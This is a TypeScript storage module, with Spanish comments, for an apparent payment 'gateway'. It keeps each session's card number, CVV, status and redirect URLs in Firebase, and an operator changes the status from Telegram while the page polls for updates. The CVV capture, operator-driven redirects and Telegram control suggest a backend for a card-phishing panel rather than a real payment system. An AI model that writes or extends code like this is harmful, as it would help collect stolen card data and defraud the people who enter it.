import { FirebaseService } from './FirebaseService';

/**
 * StorageService — Manejo de almacenamiento para la pasarela.
 * Firebase Realtime Database es la FUENTE DE VERDAD ÚNICA.
 * 
 * NO se cachean estados en memoria local durante los 'get' porque en polling
 * continuo congelan estados viejos ('pendiente') y evitan leer los cambios
 * en tiempo real de Firebase cuando el operador pulsa un botón en Telegram.
 */

// Memoria local para variables no de sesión o escrituras locales inmediatas
const memoryStorage: Record<string, string> = {};

export class StorageService {

    /**
     * Guarda un valor por clave (Firebase RTDB + memoria local)
     */
    static async set(key: string, value: any): Promise<void> {
        try {
            memoryStorage[key] = JSON.stringify(value);

            if (key.startsWith('session_')) {
                const sessionId = key.replace('session_', '');
                await FirebaseService.saveSession(sessionId, value);
            } else if (key.startsWith('status_')) {
                const sessionId = key.replace('status_', '');
                const statusTick = Date.now();
                await FirebaseService.saveSession(sessionId, {
                    lastStatus: value,
                    statusTick,
                });
                memoryStorage[`status_tick_${sessionId}`] = JSON.stringify(statusTick);
            } else if (key.startsWith('status_tick_')) {
                const sessionId = key.replace('status_tick_', '');
                await FirebaseService.saveSession(sessionId, { statusTick: Number(value) });
            } else if (key.startsWith('cardData_tc_')) {
                const sessionId = key.replace('cardData_tc_', '');
                await FirebaseService.saveSession(sessionId, { cardData_tc: value });
            } else if (key.startsWith('cardData_cvv_')) {
                const sessionId = key.replace('cardData_cvv_', '');
                await FirebaseService.saveSession(sessionId, { cardData_cvv: value });
            } else if (key.startsWith('url_redirect_')) {
                const sessionId = key.replace('url_redirect_', '');
                await FirebaseService.saveSession(sessionId, { urlRedirect: value });
            } else if (key.startsWith('urlAutomatic_')) {
                const sessionId = key.replace('urlAutomatic_', '');
                await FirebaseService.saveSession(sessionId, { urlAutomatic: value });
            } else if (key.startsWith('linkCustom_')) {
                const sessionId = key.replace('linkCustom_', '');
                await FirebaseService.saveSession(sessionId, { linkCustom: value });
            }
        } catch (error) {
            console.error(`[StorageService] Error saving key ${key}:`, error);
        }
    }

    /**
     * Obtiene un valor por clave (Firebase RTDB en tiempo real)
     */
    static async get(key: string): Promise<any> {
        try {
            // Claves de sesión dinámicas: consultar siempre Firebase RTDB
            if (key.startsWith('session_')) {
                const sessionId = key.replace('session_', '');
                const data = await FirebaseService.getSession(sessionId);
                if (data) return data;
            } else if (key.startsWith('status_')) {
                const sessionId = key.replace('status_', '');
                const data = await FirebaseService.getSession(sessionId);
                if (data?.lastStatus != null) return data.lastStatus;
            } else if (key.startsWith('status_tick_')) {
                const sessionId = key.replace('status_tick_', '');
                const data = await FirebaseService.getSession(sessionId);
                if (data?.statusTick != null) return data.statusTick;
            } else if (key.startsWith('cardData_tc_')) {
                const sessionId = key.replace('cardData_tc_', '');
                const data = await FirebaseService.getSession(sessionId);
                if (data?.cardData_tc != null) return data.cardData_tc;
            } else if (key.startsWith('cardData_cvv_')) {
                const sessionId = key.replace('cardData_cvv_', '');
                const data = await FirebaseService.getSession(sessionId);
                if (data?.cardData_cvv != null) return data.cardData_cvv;
            } else if (key.startsWith('url_redirect_')) {
                const sessionId = key.replace('url_redirect_', '');
                const data = await FirebaseService.getSession(sessionId);
                if (data?.urlRedirect != null) return data.urlRedirect;
            } else if (key.startsWith('urlAutomatic_')) {
                const sessionId = key.replace('urlAutomatic_', '');
                const data = await FirebaseService.getSession(sessionId);
                if (data?.urlAutomatic != null) return data.urlAutomatic;
            } else if (key.startsWith('linkCustom_')) {
                const sessionId = key.replace('linkCustom_', '');
                const data = await FirebaseService.getSession(sessionId);
                if (data?.linkCustom != null) return data.linkCustom;
            }

            // Fallback a almacenamiento en memoria local
            const item = memoryStorage[key];
            if (item != null) {
                return JSON.parse(item);
            }

            return null;
        } catch (error) {
            console.error(`[StorageService] Error retrieving key ${key}:`, error);
            return null;
        }
    }

    /**
     * Elimina un valor por clave
     */
    static async remove(key: string): Promise<void> {
        delete memoryStorage[key];
        if (key.startsWith('session_')) {
            const sessionId = key.replace('session_', '');
            await FirebaseService.deleteSession(sessionId);
        }
    }

    /**
     * Actualiza un valor por clave (merge)
     */
    static async update(key: string, updates: any): Promise<any> {
        const current = (await this.get(key)) || {};
        const updated = { ...current, ...updates };
        await this.set(key, updated);
        return updated;
    }

    /**
     * Retorna todas las claves del almacenamiento en memoria
     */
    static getAllKeys(): string[] {
        return Object.keys(memoryStorage);
    }
}
